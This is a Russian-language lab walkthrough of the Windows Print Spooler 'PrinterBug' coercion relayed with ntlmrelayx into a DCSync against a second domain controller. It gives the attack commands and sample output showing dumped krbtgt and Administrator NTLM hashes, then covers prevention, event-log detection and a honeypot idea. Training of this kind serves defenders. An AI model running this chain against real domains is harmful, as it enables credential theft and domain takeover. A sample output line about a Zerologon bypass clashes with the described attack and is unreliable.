=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1			172.16.18.3
	-	DC2			172.16.18.4
	-	Server01	172.16.18.10
	-	PKI			172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)			Поключаемся к хосту жертвы через RDP
	ii)			Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
				User Name	=	Имя пользователя (к примеру htb-student)
	iv)			Пароль введем позже (будет предоставлен запрос)
	v)			Соглашаемся на устанвку соединения
	
=====================================================================
* Легенда *
***********

Print Spooler — это старая служба, включенная по умолчанию, даже в последних версиях Windows Desktop и Servers. (https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler)

Служба стала популярным вектором атак, когда в 2018 году Ли Кристенсен обнаружил PrinterBug.
Функции RpcRemoteFindFirstPrinterChangeNotification и RpcRemoteFindFirstPrinterChangeNotificationEx можно использовать для принудительного подключения удаленной машины к любой другой машине, к которой она может подключиться.
Более того, обратное подключение будет содержать информацию об аутентификации в виде TGT.
Таким образом, любой пользователь домена может заставить RemoteServer$ пройти аутентификацию на любой машине.

	RpcRemoteFindFirstPrinterChangeNotification		-	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83
	RpcRemoteFindFirstPrinterChangeNotificationEx	-	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d

Позиция Microsoft в отношении PrinterBug заключалась в том, что она не будет исправлена, поскольку проблема «предусмотрена».
Влияние PrinterBug заключается в том, что любой контроллер домена, на котором включен Диспетчер печати, может быть скомпрометирован одним из следующих способов:

	-	Передача подключения на другой контроллер домена и выполнение DCSync (если отключено подписывание SMB).
		Заставьте контроллер домена подключиться к машине, настроенной для Unconstrained Delegation or UD (неограниченного делегирования) — это кэширует TGT в памяти сервера UD, который можно захватить/экспортировать с помощью таких инструментов, как Rubeus и Mimikatz.

	-	Передача соединения в службы сертификации Active Directory, чтобы получить сертификат для контроллера домена.
		Затем агенты угроз могут использовать сертификат по требованию для аутентификации и выдавать себя за контроллер домена (например, DCSync).

	-	Передача соединения для настройки делегирования Kerberos на основе ресурсов для ретранслируемой машины.
		Затем мы можем злоупотребить делегированием, чтобы аутентифицироваться как любой администратор на этой машине.

=====================================================================
* Схема атаки *
***************

В этом типе атаки мы перенаправим соединение на другой DC и выполним DCSync (т. е. первую из перечисленных скомпрометированных техник).
Для успешной атаки необходимо отключить SMB Signing on Domain Controllers.

Помимо известных нам утилит (RUbeus, Mimikatz и несколькиз PS-скриптов), нам понадобиться несколько новых утилит:

	i)		Impacket (https://github.com/fortra/impacket/tree/master)
			Impacket — это коллекция (библиотека) Python-скриптов для работы с сетевыми протоколами.
			Он ориентирован на предоставление низкоуровневого программного доступа к пакетам и для некоторых протоколов (например, SMB1-3 и MSRPC) самой реализации протокола.
			Пакеты могут быть созданы с нуля, а также проанализированы из необработанных данных, а объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов.
			Библиотека предоставляет набор инструментов в качестве примеров того, что можно сделать в контексте этой библиотеки.
	
	ii)		Python-скрипт NTLMRelayx (https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
			NTLMRelayx	-	этот скрипт выполняет атаки SMB Relay, первоначально обнаруженные cDc, и расширенные на многие целевые протоколы (SMB, MSSQL, LDAP и т. д.).
			***	Он входит в коллекцию скриптов Impacket
			Он получает список целей и для каждого полученного соединения выбирает следующую цель и пытается ретранслировать учетные данные.
			Кроме того, если указано, он сначала попытается пройти аутентификацию на клиенте, подключающемся к нам.
			Его реализация происзодит путем вызова SMB и HTTP-сервера, подключения к нескольким функциям, а затем использования определенных клиентов протокола (например, SMB, LDAP).
			Предполагается, что он работает на любом уровне совместимости LM.

			Единственный способ остановить эту атаку — принудительно применить проверки SPN на сервере и/или подпись.
			Если аутентификация на целях проходит успешно, аутентификация клиента также проходит успешно, и устанавливается допустимое соединение с локальным smbserver.
			Пользователь должен настроить функциональность локального smbserver.
			Один из вариантов — настроить общие ресурсы с любыми файлами, которые вы хотите, чтобы жертва думала, что она подключена к допустимому SMB-серверу.
			Все это делается через файл smb.conf или программно.
	
	iii)	Python-скрипт Dementor (https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py)
			Данный скрипт взаимодействует с диспетчером очереди печати принтера (printer spooler) на хосте для запуска аутентификации с целевого IP на хост, контролируемый злоумышленником (обычно это сервер SMB или HTTP).
			Затем эта захваченная аутентификация может быть ретранслирована для аутентификации на другие хосты.
			Подробнее см. в ntlmrelayx.py.

Итак, для начала мы настроим NTLMRelayx для пересылки любых соединений на DC2 и попытаемся выполнить атаку DCSync
*** При этом нам не обязательно подключаться к любому хосту домена, а можно использовать обсалютно любую машину

	user_name@~$ impacket-ntlmrelayx -t dcsync://<domain_controller_#2_ip> -smb2support

Далее нам нужно запустить PrinterBug с прослушиванием NTLMRelayx.
Чтобы запустить обратное соединение, мы воспользуемся скриптом Dementor
***	При запуске с машины, не присоединенной к домену, требуются любые аутентифицированные учетные данные пользователя, и в этом случае мы предположили, что ранее скомпрометировали Боба:

	user_name@<dementor_location_folder>$python3 ./dementor.py <attacking_host_ip> <domain_controller_#1_ip> -u <domain_user_name> -d <domain_name>.local -p <user_password>

Теперь, переключившись обратно на терминальный сеанс с NTLMRelayx, мы увидим, что DCSync прошел успешно
Для полной уверенности, в выводе на экране должна присутсвовать следующая информация

	...SNIP...
	[*] SMBD-Thread-5 (process_request_thread): Received connection from <domain_controller_#1_ip>, attacking target dcsync://<domain_controller_#2_ip>
	...SNIP...
	[*] Netlogon Auth OK, successfully bypassed autentication using Zerologon after 22 attempts!
	[*] EAGLE\DC1$ successfully validated through NETLOGON
	[*] NTLM Sign/seal key: a3cd52a7af8e3a6611f9aede80edafe3 
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:db0d0630064747072a7da3f7c3b4069e:::
	...SNIP...
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	DC2$:1110:aad3b435b51404eeaad3b435b51404ee:58db320c0b8b9c6be16099b5d2ac649c:::
	...SNIP...
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcdc65703dd2b0bd789977f1f3eeaecf:::
	...SNIP...
	[*] SMBD-Thread-8 (process_request_thread): Connection from 172.16.18.3 controlled, but there are no more targets left!

Как мы видим, скопрометированный пользователь был использован для атака на <domain_controller_#2_ip> путем проброса через <domain_controller_#1_ip>
Также мы спешно смогли захватить несколько NTLM-хэшей

=====================================================================
* Предотвращение/защита *
*************************

Print Spooler следует отключить на всех серверах, которые не являются серверами печати.

​​Контроллеры домена и другие основные серверы никогда не должны иметь дополнительных ролей/функций, которые открывают и расширяют поверхность атаки в сторону базовой инфраструктуры AD.

Кроме того, есть возможность предотвратить злоупотребление PrinterBug, сохраняя при этом работу службы
При отключении ключа реестра RegisterSpoolerRemoteRpcEndPoint все входящие удаленные запросы блокируются
Это действует так, как если бы служба была отключена для удаленных клиентов.
Установка ключа реестра на 1 включает ее, а 2 отключает

Regkey расположен тут	-	Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers
=====================================================================
* Обнаружение *
***************

Эксплуатация PrinterBug оставит следы сетевых подключений к контроллеру домена
Однако они слишком общие, чтобы их можно было использовать в качестве механизма обнаружения.

В случае использования NTLMRelayx для выполнения DCSync идентификатор события 4662 (An operation was performed on an object) сгенерирован не будет 
Так как атака происходила с IP-адреса машины, которая не является частью домена, а не контроллера домена
Однако для получения хэшей как DC1 из DC2 будет иметь место успешное событие входа для DC1
Поэтому, необходимо будет проверять события 4624 (An account was successfully logged on) на <domain_controller_#2_ip>
И сопоставлять значение поля Account Name (в разделе New Logon) со значением поля Source Network Address (в раздел Network Information)
И если Account Name <domain_controller_name> будет иметь отличный от его значения IP адрес, то это может указывать на попытку проброса атаки

=====================================================================
* Ловушка/Honeypot *
********************

PrinterBug можно использовать как средство оповещения о подозрительном поведении в среде.

В описанном выше примере мы могли бы заблокировали исходящие соединения с наших серверов на порты 139 и 445;
Этого можно добиться с помощью программного обеспечения или физических брандмауэров.
Несмотря на то, что злоупотребление может вызвать ошибку, правила брандмауэра не позволят обратному соединению достичь агента угрозы.
Однако эти заблокированные соединения будут действовать как признаки компрометации для синей команды.
Что может создать избыточное количество ложных оповещений и перегрузить синюю команду

Прежде чем применять что-либо, связанное с этим эксплойтом, мы должны убедиться, что у нас достаточно журналов и знаний о нашей среде, чтобы гарантировать, что разрешены законные соединения
Например, мы должны держать упомянутые порты открытыми между контроллерами домена, чтобы они могли реплицировать данные.

Хотя это может показаться подходящим для приманки, чтобы обмануть злоумышленников, мы должны быть осторожны перед его реализацией
Так как в настоящее время ошибка требует, чтобы машина подключалась к нам обратно
Но если будет обнаружена новая неизвестная ошибка, которая позволяет выполнить какой-либо тип удаленного выполнения кода без обратного соединения, то это обернется против нас.
Поэтому нам следует использовать этот вариант только в том случае, если мы являемся очень зрелой организацией и можем оперативно реагировать на оповещения и отключать службу на всех устройствах в случае обнаружения новой ошибки.

